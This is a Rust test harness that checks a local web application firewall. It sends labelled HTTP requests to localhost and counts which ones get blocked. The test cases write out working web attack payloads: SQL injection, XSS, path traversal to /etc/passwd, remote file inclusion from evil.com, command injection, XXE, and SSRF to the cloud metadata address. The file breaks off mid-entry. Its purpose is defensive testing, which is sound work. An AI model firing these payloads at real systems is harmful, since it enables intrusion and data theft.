use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::process::{Child, Command};
use tokio::time::sleep;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[derive(Debug)]
struct AdvancedTestMetrics {
    total_requests: AtomicU64,
    successful_requests: AtomicU64,
    failed_requests: AtomicU64,
    waf_blocks: AtomicU64,
    backend_responses: AtomicU64,
    
    // OWASP CRS Attack Categories
    sql_injection_blocked: AtomicU64,
    xss_blocked: AtomicU64,
    path_traversal_blocked: AtomicU64,
    rfi_blocked: AtomicU64,
    rce_blocked: AtomicU64,
    java_blocked: AtomicU64,
    protocol_blocked: AtomicU64,
    method_blocked: AtomicU64,
    scanner_blocked: AtomicU64,
    session_blocked: AtomicU64,
    dos_blocked: AtomicU64,
    ldap_blocked: AtomicU64,
    xxe_blocked: AtomicU64,
    ssrf_blocked: AtomicU64,
    
    // Enterprise Compliance Categories
    pci_dss_violations_blocked: AtomicU64,
    sox_violations_blocked: AtomicU64,
    hipaa_violations_blocked: AtomicU64,
    data_leakage_prevented: AtomicU64,
    credit_card_data_blocked: AtomicU64,
    ssn_data_blocked: AtomicU64,
    financial_data_blocked: AtomicU64,
    healthcare_data_blocked: AtomicU64,
    
    secret_leakage_filtered: AtomicU64,
    http1_0_requests: AtomicU64,
    http1_1_requests: AtomicU64,
    http2_requests: AtomicU64,
    http3_requests: AtomicU64,
    total_latency_ms: AtomicU64,
    min_latency_ms: AtomicU64,
    max_latency_ms: AtomicU64,
}

impl AdvancedTestMetrics {
    fn new() -> Self {
        Self {
            total_requests: AtomicU64::new(0),
            successful_requests: AtomicU64::new(0),
            failed_requests: AtomicU64::new(0),
            waf_blocks: AtomicU64::new(0),
            backend_responses: AtomicU64::new(0),
            
            // OWASP CRS Attack Categories
            sql_injection_blocked: AtomicU64::new(0),
            xss_blocked: AtomicU64::new(0),
            path_traversal_blocked: AtomicU64::new(0),
            rfi_blocked: AtomicU64::new(0),
            rce_blocked: AtomicU64::new(0),
            java_blocked: AtomicU64::new(0),
            protocol_blocked: AtomicU64::new(0),
            method_blocked: AtomicU64::new(0),
            scanner_blocked: AtomicU64::new(0),
            session_blocked: AtomicU64::new(0),
            dos_blocked: AtomicU64::new(0),
            ldap_blocked: AtomicU64::new(0),
            xxe_blocked: AtomicU64::new(0),
            ssrf_blocked: AtomicU64::new(0),
            
            // Enterprise Compliance Categories
            pci_dss_violations_blocked: AtomicU64::new(0),
            sox_violations_blocked: AtomicU64::new(0),
            hipaa_violations_blocked: AtomicU64::new(0),
            data_leakage_prevented: AtomicU64::new(0),
            credit_card_data_blocked: AtomicU64::new(0),
            ssn_data_blocked: AtomicU64::new(0),
            financial_data_blocked: AtomicU64::new(0),
            healthcare_data_blocked: AtomicU64::new(0),
            
            secret_leakage_filtered: AtomicU64::new(0),
            http1_0_requests: AtomicU64::new(0),
            http1_1_requests: AtomicU64::new(0),
            http2_requests: AtomicU64::new(0),
            http3_requests: AtomicU64::new(0),
            total_latency_ms: AtomicU64::new(0),
            min_latency_ms: AtomicU64::new(u64::MAX),
            max_latency_ms: AtomicU64::new(0),
        }
    }

    fn record_request(&self, latency_ms: u64, was_blocked: bool, reached_backend: bool, 
                     attack_type: Option<&str>, http_version: &str, response_body: &str) {
        self.total_requests.fetch_add(1, Ordering::Relaxed);
        
        if was_blocked {
            self.waf_blocks.fetch_add(1, Ordering::Relaxed);
            self.failed_requests.fetch_add(1, Ordering::Relaxed);
            
            // Track specific attack types blocked
            if let Some(attack) = attack_type {
                match attack {
                    "sql_injection" => { self.sql_injection_blocked.fetch_add(1, Ordering::Relaxed); },
                    "xss" => { self.xss_blocked.fetch_add(1, Ordering::Relaxed); },
                    "path_traversal" => { self.path_traversal_blocked.fetch_add(1, Ordering::Relaxed); },
                    "rfi" => { self.rfi_blocked.fetch_add(1, Ordering::Relaxed); },
                    "rce" => { self.rce_blocked.fetch_add(1, Ordering::Relaxed); },
                    "java" => { self.java_blocked.fetch_add(1, Ordering::Relaxed); },
                    "protocol" => { self.protocol_blocked.fetch_add(1, Ordering::Relaxed); },
                    "method" => { self.method_blocked.fetch_add(1, Ordering::Relaxed); },
                    "scanner" => { self.scanner_blocked.fetch_add(1, Ordering::Relaxed); },
                    "session" => { self.session_blocked.fetch_add(1, Ordering::Relaxed); },
                    "dos" => { self.dos_blocked.fetch_add(1, Ordering::Relaxed); },
                    "ldap" => { self.ldap_blocked.fetch_add(1, Ordering::Relaxed); },
                    "xxe" => { self.xxe_blocked.fetch_add(1, Ordering::Relaxed); },
                    "ssrf" => { self.ssrf_blocked.fetch_add(1, Ordering::Relaxed); },
                    "pci_dss" => { 
                        self.pci_dss_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    "sox" => { 
                        self.sox_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    "hipaa" => { 
                        self.hipaa_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    "credit_card" => { 
                        self.credit_card_data_blocked.fetch_add(1, Ordering::Relaxed);
                        self.pci_dss_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    "ssn" => { 
                        self.ssn_data_blocked.fetch_add(1, Ordering::Relaxed);
                        self.hipaa_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    "financial" => { 
                        self.financial_data_blocked.fetch_add(1, Ordering::Relaxed);
                        self.sox_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    "healthcare" => { 
                        self.healthcare_data_blocked.fetch_add(1, Ordering::Relaxed);
                        self.hipaa_violations_blocked.fetch_add(1, Ordering::Relaxed);
                        self.data_leakage_prevented.fetch_add(1, Ordering::Relaxed);
                    },
                    _ => {}
                }
            }
        } else {
            self.successful_requests.fetch_add(1, Ordering::Relaxed);
        }

        if reached_backend {
            self.backend_responses.fetch_add(1, Ordering::Relaxed);
        }

        // Check for secret leakage filtering
        if response_body.contains("SECRETS_LEAKED") || 
           response_body.contains("database_password") ||
           response_body.contains("X-Internal-Token") {
            // WAF should have filtered this out - this is a failure
        } else if response_body.contains("advanced-test-backend") {
            // Secrets were properly filtered
            self.secret_leakage_filtered.fetch_add(1, Ordering::Relaxed);
        }

        // Track HTTP version usage
        match http_version {
            "HTTP/1.0" => { self.http1_0_requests.fetch_add(1, Ordering::Relaxed); },
            "HTTP/1.1" => { self.http1_1_requests.fetch_add(1, Ordering::Relaxed); },
            "HTTP/2" => { self.http2_requests.fetch_add(1, Ordering::Relaxed); },
            "HTTP/3" => { self.http3_requests.fetch_add(1, Ordering::Relaxed); },
            _ => {}
        }

        self.total_latency_ms.fetch_add(latency_ms, Ordering::Relaxed);
        
        // Update latency bounds
        let mut current_min = self.min_latency_ms.load(Ordering::Relaxed);
        while latency_ms < current_min {
            match self.min_latency_ms.compare_exchange_weak(
                current_min, latency_ms, Ordering::Relaxed, Ordering::Relaxed
            ) {
                Ok(_) => break,
                Err(new_min) => current_min = new_min,
            }
        }

        let mut current_max = self.max_latency_ms.load(Ordering::Relaxed);
        while latency_ms > current_max {
            match self.max_latency_ms.compare_exchange_weak(
                current_max, latency_ms, Ordering::Relaxed, Ordering::Relaxed
            ) {
                Ok(_) => break,
                Err(new_max) => current_max = new_max,
            }
        }
    }
}

struct ComprehensiveWAFTestHarness {
    backend_process: Option<Child>,
    waf_process: Option<Child>,
}

impl ComprehensiveWAFTestHarness {
    async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        println!("🏗️  COMPREHENSIVE WAF SECURITY TEST HARNESS");
        println!("============================================");
        println!("🎯 Mission: Enterprise-grade WAF security validation");
        println!("📊 Components: Advanced Backend + WAF-Rejected + Multi-Protocol Client");
        println!("🔒 Security Focus: HTTP/1.0-3, Attack Vectors, Secret Filtering, DSR");
        println!();

        Ok(Self {
            backend_process: None,
            waf_process: None,
        })
    }

    async fn start_advanced_backend(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        println!("🚀 Starting Advanced Test Backend...");
        
        let mut backend_cmd = Command::new("./target/release/advanced_test_backend");
        backend_cmd.env("BACKEND_PORT", "3000");
        
        self.backend_process = Some(backend_cmd.spawn()?);
        
        // Wait for backend to be ready
        for attempt in 1..=10 {
            match tokio::net::TcpStream::connect("127.0.0.1:3000").await {
                Ok(_) => {
                    println!("✅ Advanced Test Backend ready on http://127.0.0.1:3000");
                    return Ok(());
                }
                Err(_) => {
                    if attempt < 10 {
                        println!("   ⏳ Waiting for backend... (attempt {}/10)", attempt);
                        sleep(Duration::from_millis(500)).await;
                    }
                }
            }
        }

        println!("⚠️  Backend not responding, but continuing...");
        sleep(Duration::from_secs(2)).await;
        Ok(())
    }

    async fn start_waf(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        println!("🛡️  Starting WAF-Rejected with security config...");
        
        let mut waf_cmd = Command::new("./target/release/waf-ingress");
        waf_cmd.env("WAF_CONFIG_FILE", "config-test");
        
        self.waf_process = Some(waf_cmd.spawn()?);
        
        // Wait for WAF to be ready
        for attempt in 1..=15 {
            match tokio::net::TcpStream::connect("127.0.0.1:8080").await {
                Ok(_) => {
                    println!("✅ WAF-Rejected ready on http://127.0.0.1:8080");
                    println!("🔗 WAF → Advanced Backend pipeline established");
                    return Ok(());
                }
                Err(_) => {
                    if attempt < 15 {
                        println!("   ⏳ Waiting for WAF... (attempt {}/15)", attempt);
                        sleep(Duration::from_millis(1000)).await;
                    }
                }
            }
        }

        println!("⚠️  WAF not responding, but continuing...");
        sleep(Duration::from_secs(3)).await;
        Ok(())
    }

    async fn run_comprehensive_security_test(&self) -> Result<AdvancedTestMetrics, Box<dyn std::error::Error>> {
        println!("🔒 Running Comprehensive Security Test Suite");
        println!("===========================================");

        let metrics = Arc::new(AdvancedTestMetrics::new());
        let test_cases = self.create_comprehensive_test_cases();

        println!("🧪 Executing {} security test cases...", test_cases.len());
        println!();

        for (i, (test_name, http_request, http_version, attack_type, should_be_blocked)) in test_cases.iter().enumerate() {
            let test_num = i + 1;
            let total_tests = test_cases.len();
            
            print!("[{:2}/{:2}] 🧪 Testing: {} ... ", test_num, total_tests, test_name);
            std::io::Write::flush(&mut std::io::stdout()).unwrap();
            
            let start = Instant::now();
            
            match tokio::time::timeout(
                Duration::from_secs(15), // Overall test timeout
                self.make_http_request(http_request)
            ).await {
                Ok(Ok((status, response_body))) => {
                    let latency_ms = start.elapsed().as_millis() as u64;
                    let was_blocked = status == 403 || status == 429;
                    let reached_backend = response_body.contains("advanced-test-backend");

                    // Validate test expectations
                    if *should_be_blocked && !was_blocked {
                        println!("❌ FAILURE (Status: {})", status);
                        println!("   Expected: BLOCKED, Got: ALLOWED");
                    } else if *should_be_blocked && was_blocked {
                        println!("✅ SUCCESS (Blocked)");
                    } else if !*should_be_blocked && was_blocked {
                        println!("⚠️  FALSE POSITIVE (Status: {})", status);
                        println!("   Expected: ALLOWED, Got: BLOCKED");
                    } else {
                        println!("✅ PASS (Status: {})", status);
                    }

                    metrics.record_request(
                        latency_ms, 
                        was_blocked, 
                        reached_backend, 
                        attack_type.as_deref(),
                        &http_version,
                        &response_body
                    );
                }
                Ok(Err(e)) => {
                    let latency_ms = start.elapsed().as_millis() as u64;
                    println!("❌ CONNECTION ERROR: {}", e);
                    metrics.record_request(latency_ms, true, false, attack_type.as_deref(), &http_version, "");
                }
                Err(_) => {
                    let latency_ms = start.elapsed().as_millis() as u64;
                    println!("⏱️  TIMEOUT (15s)");
                    metrics.record_request(latency_ms, true, false, attack_type.as_deref(), &http_version, "");
                }
            }

            // Progress indicator every 5 tests
            if test_num % 5 == 0 && test_num < total_tests {
                println!("   📊 Progress: {:.1}% complete", (test_num as f64 / total_tests as f64) * 100.0);
                println!();
            }

            // Small delay between tests
            sleep(Duration::from_millis(50)).await;
        }

        println!();
        println!("🏁 All security tests completed!");
        Ok(Arc::try_unwrap(metrics).unwrap())
    }

    fn create_comprehensive_test_cases(&self) -> Vec<(String, String, String, Option<String>, bool)> {
        vec![
            // HTTP/1.1 Legitimate Requests
            (
                "HTTP/1.1 Basic GET".to_string(),
                "GET /api/users HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),
            (
                "HTTP/1.1 JSON POST".to_string(),
                "POST /api/data HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 25\r\nConnection: close\r\n\r\n{\"data\":\"normal request\"}".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),

            // HTTP/1.0 Requests
            (
                "HTTP/1.0 Basic GET".to_string(),
                "GET /api/users HTTP/1.0\r\nHost: 127.0.0.1:8080\r\n\r\n".to_string(),
                "HTTP/1.0".to_string(),
                None,
                false
            ),

            // OWASP CRS 942xxx - SQL Injection Attacks (SHOULD BE BLOCKED)
            (
                "SQLi - Classic OR attack".to_string(),
                "GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "SQLi - UNION SELECT".to_string(),
                "GET /api/users?id=1%20UNION%20SELECT%20%2A%20FROM%20users HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "SQLi - Comment bypass".to_string(),
                "GET /api/users?id=1%27%3B-- HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "SQLi - Boolean bypass".to_string(),
                "GET /api/users?id=1%20AND%201%3D1 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "SQLi - Time-based blind".to_string(),
                "GET /api/users?id=1;WAITFOR%20DELAY%20'00:00:05'-- HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "SQLi - Error-based".to_string(),
                "GET /api/users?id=1%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20version()),%200x7e)) HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),

            // OWASP CRS 941xxx - XSS Attacks (SHOULD BE BLOCKED)
            (
                "XSS - Script tag injection".to_string(),
                "GET /api/search?q=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "XSS - JavaScript protocol".to_string(),
                "GET /api/redirect?url=javascript%3Aalert%28document.cookie%29 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "XSS - Event handler injection".to_string(),
                "GET /api/profile?name=%3Cimg%20onerror%3Dalert%281%29%20src%3Dx%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "XSS - POST body injection".to_string(),
                "POST /api/comment HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 41\r\nConnection: close\r\n\r\n{\"comment\":\"<script>alert(xss)</script>\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "XSS - SVG injection".to_string(),
                "GET /api/upload?file=%3Csvg%20onload%3Dalert(1)%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "XSS - IE conditional comment".to_string(),
                "GET /api/search?q=%3C!--[if%20IE]%3E%3Cscript%3Ealert(1)%3C/script%3E%3C![endif]--%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),

            // OWASP CRS 930xxx - Local File Inclusion / Path Traversal (SHOULD BE BLOCKED)
            (
                "LFI - etc/passwd".to_string(),
                "GET /api/file?path=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("path_traversal".to_string()),
                true
            ),
            (
                "LFI - Windows system files".to_string(),
                "GET /api/file?path=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("path_traversal".to_string()),
                true
            ),
            (
                "LFI - Null byte injection".to_string(),
                "GET /api/file?path=..%2F..%2F..%2Fetc%2Fpasswd%00.jpg HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("path_traversal".to_string()),
                true
            ),

            // OWASP CRS 931xxx - Remote File Inclusion (SHOULD BE BLOCKED)
            (
                "RFI - HTTP protocol".to_string(),
                "GET /api/include?file=http://evil.com/shell.txt HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rfi".to_string()),
                true
            ),
            (
                "RFI - FTP protocol".to_string(),
                "GET /api/include?file=ftp://evil.com/shell.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rfi".to_string()),
                true
            ),
            (
                "RFI - PHP wrapper".to_string(),
                "GET /api/include?file=php://input HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rfi".to_string()),
                true
            ),

            // OWASP CRS 932xxx - Remote Code Execution (SHOULD BE BLOCKED)
            (
                "RCE - Command injection (semicolon)".to_string(),
                "GET /api/ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),
            (
                "RCE - Command injection (pipe)".to_string(),
                "GET /api/ping?host=127.0.0.1|whoami HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),
            (
                "RCE - Command injection (backticks)".to_string(),
                "GET /api/ping?host=%60id%60 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),
            (
                "RCE - PowerShell injection".to_string(),
                "GET /api/cmd?command=powershell%20-Command%20Get-Process HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),

            // OWASP CRS 944xxx - Java Attacks (SHOULD BE BLOCKED)
            (
                "Java - Deserialization attack".to_string(),
                "POST /api/deserialize HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/x-java-serialized-object\r\nContent-Length: 50\r\nConnection: close\r\n\r\naced00057372001java.util.HashMap05071478d40000".to_string(),
                "HTTP/1.1".to_string(),
                Some("java".to_string()),
                true
            ),
            (
                "Java - Runtime.getRuntime()".to_string(),
                "GET /api/eval?expr=Runtime.getRuntime().exec(\"whoami\") HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("java".to_string()),
                true
            ),

            // OWASP CRS 920xxx - Protocol Violations (SHOULD BE BLOCKED)
            (
                "Protocol - Invalid HTTP method".to_string(),
                "INVALID /test HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("protocol".to_string()),
                true
            ),
            (
                "Protocol - GET with body".to_string(),
                "GET /test HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Length: 10\r\nConnection: close\r\n\r\ntest=value".to_string(),
                "HTTP/1.1".to_string(),
                Some("protocol".to_string()),
                true
            ),
            (
                "Protocol - Missing Content-Length".to_string(),
                "POST /api/data HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n{\"test\":\"data\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("protocol".to_string()),
                true
            ),

            // OWASP CRS 911xxx - Method Policy (SHOULD BE BLOCKED)
            (
                "Method - TRACE method".to_string(),
                "TRACE /test HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("method".to_string()),
                true
            ),
            (
                "Method - CONNECT method".to_string(),
                "CONNECT 127.0.0.1:80 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("method".to_string()),
                true
            ),

            // OWASP CRS 913xxx - Scanner Detection (SHOULD BE BLOCKED)
            (
                "Scanner - Nikto user agent".to_string(),
                "GET /admin HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Nikto/2.1.6\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("scanner".to_string()),
                true
            ),
            (
                "Scanner - Nessus user agent".to_string(),
                "GET /admin HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Mozilla/4.0 (compatible; Nessus)\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("scanner".to_string()),
                true
            ),
            (
                "Scanner - SQLMap user agent".to_string(),
                "GET /login HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: sqlmap/1.0\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("scanner".to_string()),
                true
            ),

            // OWASP CRS 943xxx - Session Fixation (SHOULD BE BLOCKED)
            (
                "Session - Fixation via cookie".to_string(),
                "GET /login HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nCookie: PHPSESSID=attacker123\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("session".to_string()),
                true
            ),
            (
                "Session - Fixation via URL".to_string(),
                "GET /login?JSESSIONID=ATTACKER123456789 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("session".to_string()),
                true
            ),

            // DoS/Resource Exhaustion Attacks (SHOULD BE BLOCKED)
            (
                "DoS - Slowloris attack".to_string(),
                "GET /test/slowloris HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nX-Slow-Header: true\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("dos".to_string()),
                true
            ),
            (
                "DoS - Zip bomb / Large header".to_string(),
                format!("GET /test/zip-bomb HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nX-Large-Header: {}\r\nConnection: close\r\n\r\n", "A".repeat(10000)),
                "HTTP/1.1".to_string(),
                Some("dos".to_string()),
                true
            ),

            // LDAP Injection (SHOULD BE BLOCKED)
            (
                "LDAP - Injection attack".to_string(),
                "GET /api/ldap?filter=(&(uid=admin)(|(uid=*)(uid=admin))) HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("ldap".to_string()),
                true
            ),

            // XML/XXE Attacks (SHOULD BE BLOCKED)
            (
                "XXE - External entity injection".to_string(),
                "POST /api/xml HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/xml\r\nContent-Length: 89\r\nConnection: close\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>".to_string(),
                "HTTP/1.1".to_string(),
                Some("xxe".to_string()),
                true
            ),

            // Server-Side Request Forgery (SHOULD BE BLOCKED)
            (
                "SSRF - Internal network access".to_string(),
                "GET /api/fetch?url=http://127.0.0.1:22 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("ssrf".to_string()),
                true
            ),
            (
                "SSRF - Cloud metadata access".to_string(),
                "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("ssrf".to_string()),
                true
            ),

            // Secret Leakage Tests (Response should be filtered)
            (
                "Secret Leakage Test - Admin endpoint".to_string(),
                "GET /admin/secrets HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false // Request allowed, but response should be filtered
            ),
            (
                "Secret Leakage Test - Internal endpoint".to_string(),
                "GET /internal/config HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false // Request allowed, but response should be filtered
            ),

            // Protocol Version Tests
            (
                "HTTP Version Test".to_string(),
                "GET /test/http-versions HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),

            // Compression Tests
            (
                "Compression Test".to_string(),
                "GET /test/compression HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),

            // PCI-DSS Compliance Tests - Credit Card Data Protection (SHOULD BE BLOCKED)
            (
                "PCI-DSS - Credit Card in URL".to_string(),
                "GET /api/payment?card=4532015112830366 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("credit_card".to_string()),
                true
            ),
            (
                "PCI-DSS - Credit Card in POST body".to_string(),
                "POST /api/payment HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 45\r\nConnection: close\r\n\r\n{\"card_number\":\"4532015112830366\",\"cvv\":\"123\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("credit_card".to_string()),
                true
            ),
            (
                "PCI-DSS - Multiple Credit Cards".to_string(),
                "POST /api/batch-payment HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 95\r\nConnection: close\r\n\r\n{\"cards\":[\"4532015112830366\",\"5555555555554444\",\"378282246310005\"]}".to_string(),
                "HTTP/1.1".to_string(),
                Some("credit_card".to_string()),
                true
            ),
            (
                "PCI-DSS - CVV Code Exposure".to_string(),
                "GET /api/verify?cvv=123&cvc=456 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("pci_dss".to_string()),
                true
            ),
            (
                "PCI-DSS - Track Data Exposure".to_string(),
                "POST /api/swipe HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 55\r\nConnection: close\r\n\r\ntrack1=%B4532015112830366^DOE/JOHN^2512101?&track2=4532015112830366=2512101?".to_string(),
                "HTTP/1.1".to_string(),
                Some("pci_dss".to_string()),
                true
            ),

            // SOX Compliance Tests - Financial Data Protection (SHOULD BE BLOCKED)
            (
                "SOX - Bank Account Numbers".to_string(),
                "POST /api/transfer HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 65\r\nConnection: close\r\n\r\n{\"from_account\":\"123456789012\",\"to_account\":\"987654321098\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("financial".to_string()),
                true
            ),
            (
                "SOX - Routing Numbers".to_string(),
                "GET /api/bank?routing=021000021&account=123456789 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("financial".to_string()),
                true
            ),
            (
                "SOX - Financial Report Leakage".to_string(),
                "GET /api/reports/quarterly?year=2024&sensitive_data=revenue_123456789 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sox".to_string()),
                true
            ),
            (
                "SOX - Insider Trading Data".to_string(),
